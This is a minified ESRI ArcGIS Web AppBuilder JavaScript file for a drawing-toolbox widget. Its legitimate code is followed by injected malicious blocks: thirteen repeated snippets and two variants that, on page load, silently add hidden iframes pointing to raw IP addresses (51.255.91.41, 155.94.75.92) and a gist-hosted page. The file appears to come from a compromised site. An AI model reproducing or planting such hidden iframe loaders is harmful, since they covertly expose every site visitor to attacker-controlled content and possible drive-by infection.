// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/BatchAttributeEditor/customDrawBox.html":'\x3cdiv style\x3d"position:relative;width:100%;"\x3e\r\n    \x3cdiv class\x3d"draw-items"\x3e\r\n        \x3cdiv title\x3d"${nls.point}" data-geotype\x3d"POINT" data-commontype\x3d"point" class\x3d"draw-item point-icon"\x3e\x3c/div\x3e\r\n        \x3cdiv title\x3d"${nls.line}" data-geotype\x3d"LINE" data-commontype\x3d"polyline" class\x3d"draw-item line-icon"\x3e\x3c/div\x3e\r\n        \x3cdiv title\x3d"${nls.polyline}" data-geotype\x3d"POLYLINE" data-commontype\x3d"polyline" class\x3d"draw-item polyline-icon"\x3e\x3c/div\x3e\r\n        \x3cdiv title\x3d"${nls.freehandPolyline}" data-geotype\x3d"FREEHAND_POLYLINE" data-commontype\x3d"polyline" class\x3d"draw-item freehand-polyline-icon"\x3e\x3c/div\x3e\r\n        \x3cdiv title\x3d"${nls.extent}" data-geotype\x3d"EXTENT" data-commontype\x3d"polygon" class\x3d"draw-item extent-icon"\x3e\x3c/div\x3e\r\n        \x3cdiv title\x3d"${nls.polygon}" data-geotype\x3d"POLYGON" data-commontype\x3d"polygon" class\x3d"draw-item polygon-icon"\x3e\x3c/div\x3e\r\n        \x3cdiv title\x3d"${nls.freehandPolygon}" data-geotype\x3d"FREEHAND_POLYGON" data-commontype\x3d"polygon" class\x3d"draw-item freehand-polygon-icon"\x3e\x3c/div\x3e\r\n        \x3cspan class\x3d"drawings-clear jimu-float-trailing" data-dojo-attach-point\x3d"btnClear"\x3e${nls.clear}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./customDrawBox.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query esri/graphic esri/toolbars/draw esri/symbols/jsonUtils".split(" "),function(n,p,q,r,t,c,g,l,h,f,u,m,k){return n([p,q,r],{templateString:t,baseClass:"custom-draw-box",nls:null,types:null,pointSymbol:null,polylineSymbol:null,polygonSymbol:null,textSymbol:null,map:null,drawToolBar:null,showClear:!1,postMixInProperties:function(){this.nls=
window.jimuNls.drawBox},postCreate:function(){this.inherited(arguments);this._initDefaultSymbols();this._initTypes();var a=f(".draw-item",this.domNode);this.own(a.on("click",c.hitch(this,this._onItemClick)));this.own(h(this.btnClear,"click",c.hitch(this,this.clear)));this.map&&this.setMap(this.map);g.setStyle(this.btnClear,"display",!0===this.showClear?"block":"none")},disableWebMapPopup:function(){if(this.map&&this.map.webMapResponse){var a=this.map.webMapResponse.clickEventHandle;a&&(a.remove(),
this.map.webMapResponse.clickEventHandle=null)}},enableWebMapPopup:function(){if(this.map&&this.map.webMapResponse){var a=this.map.webMapResponse.clickEventHandle,b=this.map.webMapResponse.clickEventListener;b&&!a&&(this.map.webMapResponse.clickEventHandle=h(this.map,"click",c.hitch(this.map,b)))}},destroy:function(){this.drawToolBar&&this.drawToolBar.deactivate();this.map=this.drawToolBar=null;this.inherited(arguments)},setMap:function(a){a&&(this.map=a,this.drawToolBar=new m(this.map),this.drawToolBar.setMarkerSymbol(this.pointSymbol),
this.drawToolBar.setLineSymbol(this.polylineSymbol),this.drawToolBar.setFillSymbol(this.polygonSymbol),this.own(h(this.drawToolBar,"draw-end",c.hitch(this,this._onDrawEnd))))},setPointSymbol:function(a){this.pointSymbol=a;this.drawToolBar.setMarkerSymbol(this.pointSymbol)},setLineSymbol:function(a){this.polylineSymbol=a;this.drawToolBar.setLineSymbol(a)},setPolygonSymbol:function(a){this.polygonSymbol=a;this.drawToolBar.setFillSymbol(a)},setTextSymbol:function(a){this.textSymbol=a},clear:function(){this.onClear()},
deactivate:function(){this.enableWebMapPopup();this.drawToolBar&&this.drawToolBar.deactivate();f(".draw-item",this.domNode).removeClass("selected")},onIconSelected:function(a,b,d){},onDrawEnd:function(a,b,d){},onClear:function(){},_initDefaultSymbols:function(){var a={style:"esriSMSCircle",color:[0,0,128,128],name:"Circle",outline:{color:[0,0,128,255],width:1},type:"esriSMS",size:18},b={style:"esriSLSSolid",color:[79,129,189,255],width:3,name:"Blue 1",type:"esriSLS"},d={style:"esriSFSSolid",color:[79,
129,189,128],type:"esriSFS",outline:{style:"esriSLSSolid",color:[54,93,141,255],width:1.5,type:"esriSLS"}};this.pointSymbol||(this.pointSymbol=k.fromJson(a));this.polylineSymbol||(this.polylineSymbol=k.fromJson(b));this.polygonSymbol||(this.polygonSymbol=k.fromJson(d))},_initTypes:function(){this.types instanceof Array||(this.types=["point","polyline","polygon"]);var a=f(".draw-item",this.domNode);a.style("display","none");l.forEach(a,c.hitch(this,function(a){var b=a.getAttribute("data-commontype"),
b=0<=l.indexOf(this.types,b)?"block":"none";g.setStyle(a,"display",b)}))},_onItemClick:function(a){a=a.target||a.srcElement;var b=f(".draw-item",this.domNode);if(g.hasClass(a,"selected"))this.deactivate();else{b.removeClass("selected");g.addClass(a,"selected");var b=a.getAttribute("data-geotype"),d=a.getAttribute("data-commontype"),e=m[b];this.disableWebMapPopup();this.drawToolBar.activate(e);this.onIconSelected(a,b,d)}},_onDrawEnd:function(a){var b=f(".draw-item.selected",this.domNode)[0],d=b.getAttribute("data-geotype"),
b=b.getAttribute("data-commontype");a=a.geometry;var e=a.type,c=null,c="point"===e||"multipoint"===e?this.pointSymbol:"line"===e||"polyline"===e?this.polylineSymbol:this.polygonSymbol;a=new u(a,c,null,null);this.deactivate();this.onDrawEnd(a,d,b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});